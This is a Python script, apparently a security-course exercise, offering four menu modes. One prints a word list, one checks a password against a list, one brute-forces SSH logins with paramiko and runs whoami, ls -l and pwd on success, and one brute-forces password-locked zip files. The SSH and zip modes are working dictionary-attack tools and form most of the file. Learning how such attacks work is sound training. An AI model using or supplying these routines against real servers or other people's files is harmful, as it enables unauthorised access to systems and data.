#!/usr/bin/python3

# In Python, create a script that prompts the user to select one of the following modes:

# Mode 1: Offensive; Dictionary Iterator
    # Accepts a user input word list file path and iterates through the word list, assigning the word being read to a variable.
    # Add a delay between words.
    # Print to the screen the value of the variable.

# Mode 2: Defensive; Password Recognized
    # Accepts a user input string.
    # Accepts a user input word list file path

    # Search the word list for the user input string.
    # Print to the screen whether the string appeared in the word list.

# Mode 3: Authenticate to an SSH server by its IP address.
    #Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.

# Mode 4: Tool that allows you to brute force attack a password-locked zip file.

# Import librabries
import time
import getpass
import paramiko
from zipfile import ZipFile

# Define variables

# Declare functions

# Mode 1: Offensive; Dictionary Iterator
    # Accepts a user input word list file path and iterates through the word list, assigning the word being read to a variable.
def iterator():
    filepath = input("Please enter the full path of the file: ")
    file = open(filepath, 'r')
    line = file.readline()

    while line: 
        line = line.rstrip()
        word = line
        print(word)
        time.sleep(1)

        line = file.readline()
    file.close()

# Mode 2: Defensive; Password Recognized
    # Accepts a user input string.
    # Accepts a user input word list file path.
    # Search the word list for the user input string.
    #Print to the screen whether the string appeared in the word list.

def finder():
    pswrd = getpass.getpass("Please enter your password: ")
    list = input("Please enter the full path of the file: ")
    file = open(list, 'r')
    line = file.readline()
    wordlist = []

    while line:
        line = line.rstrip()
        wordlist.append(line)
        line = file.readline()
    file.close()

    if pswrd in wordlist: 
        print("Your password appeared in the list and is not secure. Please change it immediately.")
    elif pswrd not in wordlist:
        print("Your password is acceptable")

# Mode 3: Authenticate to an SSH server by its IP address.
    # Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.

def ssh_authentication():
    host = input("Please provide IP address to SSH into: ")
    user = input("Please provide a username: ")
    filepath = input("Enter the filepath for the password list: ")
    port = 22
    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(filepath, 'r') as file:
            passwords = [line.rstrip() for line in file]

            for password in passwords:
                try:
                    ssh.connect(host, port, user, password)
                    stdin, stdout, stderr = ssh.exec_command("whoami")
                    time.sleep(3)
                    output = stdout.read()
                    print(output)
                    stdin, stdout, stderr = ssh.exec_command("ls -l")
                    time.sleep(3)
                    output = stdout.read()
                    print(output)
                    stdin, stdout, stderr = ssh.exec_command("pwd")
                    time.sleep(3)
                    output = stdout.read()
                    print(output)
                    print("Successful login using password:", password)
                    break  
                except paramiko.AuthenticationException:
                    print("Authentication failed using password:", password)

    except FileNotFoundError:
        print("File not found. Please check the filepath.")

# Mode 4: Tool that allows you to brute force attack a password-locked zip file.
def zip():
    zip_file = input("Please provide the path to the zip file: ")
    wordlist = input("Enter the filepath for the password list: ")

    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip()

            try:
                with ZipFile(zip_file, 'r') as zf:
                    zf.extractall(pwd=bytes(password, 'utf-8'))
                print(f"Success! The password is: {password}")
                return
            except Exception as e:
                # If the password is incorrect, it will raise an exception.
                # We ignore the exception and continue with the next password.
                pass

    print("Password not found in the list.")
  
# Main
def main():
    mode = input("""Choose mode: 
    1 for Offensive, 
    2 for Defensive      
    3 to Authenticate with ssh
    4 to unzip a file
    5 to exit: """)
    if mode == "1":
        iterator()
    elif mode == "2":
        finder()
    elif mode == "3":
        ssh_authentication()
    elif mode == "4":
        zip()
    elif mode == "5":    
        exit
    else:
        print("Invalid slection. Try again.")

main()

# End